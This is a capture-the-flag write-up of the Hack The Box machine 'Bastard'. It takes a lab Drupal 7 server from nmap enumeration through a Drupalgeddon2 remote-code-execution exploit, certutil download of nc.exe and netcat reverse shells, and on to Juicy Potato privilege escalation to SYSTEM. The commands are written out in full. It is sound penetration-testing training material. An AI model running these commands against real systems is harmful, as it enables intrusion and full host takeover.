---
description: https://www.hackthebox.eu/home/machines/profile/7
---

# Bastard

## Nmap

We can start off running `nmap -p- -T4` to quickly enumerate all available ports before running a more thorough scan on the alive ports with `nmap -p 80,135,49154 -A -T4`.

```
nmap 10.10.10.9 -p- -T4

PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknown

nmap 10.10.10.9 -p 80,135,49154 -A -T4

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.88 seconds
```

## HTTP

On port 80 we come to a web server hosting Drupal.

![Drupal on http://10.10.10.9/](<../../../.gitbook/assets/image (200) (1).png>)

On running standard enumeration we come across robots.txt which has a large list of disallowed entries. I added these into a directory list and run through them with OWASP ZAP to if we can get any HTTP code 200 hits.

![](<../../../.gitbook/assets/image (201).png>)

The key files here are maintainers.txt and upgrade.txt. Inspecting both of these files can help us conclude it is likely we are on Drupal version 7.

![maintainers.txt](<../../../.gitbook/assets/image (202) (1).png>)

If you have the Wappalyzer extension installed we can also use this to help identify the correct Drupal version.

![Wappalyzer extension for Friefox.](<../../../.gitbook/assets/image (203).png>)

I also used Drupwn to try and identify a more exact version of Drupal that is running. (More enumeration never hurts) You can find the GitHub link for this in the resources section at the end of the writeup.

![Drupwn](<../../../.gitbook/assets/image (204) (1).png>)

We can take this information and run this against `searchsploit`:

![searchploit](<../../../.gitbook/assets/image (206).png>)

Just to note how important enumeration is here. Running `searchsploit` as `searchsploit drupal 7` returns over thirty potential results on screen where as defining the exact version of 7.54 returns only eight results in `searchsploit` as shown above.

I tried the exploits above both manual and `metasploit` for "Drupalgeddon" and could not get the scripts to work. At this point I looked further on Google and found an awesome RCE script by pimps [https://github.com/pimps/CVE-2018-7600](https://github.com/pimps/CVE-2018-7600)

With the script we have remote command execution using the `-c` switch. Once downloaded we can run the script with the follow syntax:

```
python3 exploit.py -c <command>  http://10.10.10.9
```

As shown below we can test working by running `whoami` in the script.

![testing for RCE](<../../../.gitbook/assets/image (208) (1).png>)

Lets see if we can upload `netcat` and get a reverse shell going. First move over to a directory which has `nc.exe` (kali comes pre-installed with this) and then run a `Python SimpleHTTPServer` as per below:

![locating nc.exe and running a python server](<../../../.gitbook/assets/image (209).png>)

We can now run `certutil.exe` to download `nc.exe` from our attacking machine.

![Download nc.exe from our attacking machine.](<../../../.gitbook/assets/image (210).png>)

Once downloaded set up a `netcat` listener on the attacking machine with a desired port. In my examples I am using port 5555.

```
nc -lvp 5555
```

Now we can run the python exploit again this time calling the `nc.exe` to connect back to our machine to create a shell.

```
python3 exploit.py -c "nc.exe -nv 10.10.14.21 5555 -e cmd.exe"  http://10.10.10.9
```

![](<../../../.gitbook/assets/image (211).png>)

We now have a reverse shell into the victim machine.

## User

From here we can run `net user` to find user accounts and then attempt to read the user flag on the desktop.

![](<../../../.gitbook/assets/image (212) (1).png>)

## Privilege Escalation

I initially check the `systeminfo`information against `windows_exploit_suggester.py` and found some potential avenue's of escalation due to missing patches. I also checked the privileges of the account we are running as since we are a service account.

![](<../../../.gitbook/assets/image (213) (1).png>)

As you can we have the following privilege `SeImpersonatePrivilege` which is usually assigned to service accounts and is usually vulnerable to Juicy Potato attacks which as far as I am aware is generally only patched in Windows Server 2019 and Windows 10 1809 and later

Given the fact we have the above privilege on a server running Windows 2008 R2 it is probably a juicy Potato attack that will result in privilege escalation.

The Juicy Potato binary can be downloaded from here: [https://github.com/ohpe/juicy-potato/releases](https://github.com/ohpe/juicy-potato/releases)

Once downloaded upload the binary to the server using `certutil.exe` just as we did earlier when uploading `nc.exe` except this time we can run the command in our reverse shell. Once downloaded we can start to build the command to gain a reverse shell.

```
juicypotato.exe -l 1234 -p nc.exe -a " -nv 10.10.14.21 3333 -e cmd.exe" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

* \-l : Create a listening port
* \-p: Program to launch
* \-a: use the following arguments
* \-t: createprocess call: CreateProcessWithTokenW, CreateProcessAsUser, <\*> try both
* \-c: <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})

In the above example command I passed `nc.exe` the arguments we used earlier on when gaining initial shell with a different port and for the `-c` {CLSID} the default BITS did not work for me so instead I defined the wuasrv service CLSID. A CLSID list for multiple Windows version can be found here: [https://github.com/ohpe/juicy-potato/tree/master/CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID)

Before running the above command set up a `netcat` listener on the attacking machine to catch the port in which you have defined.

```
nc -lvp 3333
```

Now run the command for `JuicyPotato.exe` and see if we can catch a reverse shell. You may need to run the command a few times for it to work. If you get the command output `[+] CreateProcessWithTokenW OK` then you know it has worked but, will need to check your command syntax if you have not caught a shell.

![running juicypotato.exe](<../../../.gitbook/assets/image (214) (1).png>)

As you can see we have caught a shell as `NT AUTHORITY\SYSTEM` and can now grab the root.txt.txt flag on the administrators desktop.

![](<../../../.gitbook/assets/image (215).png>)
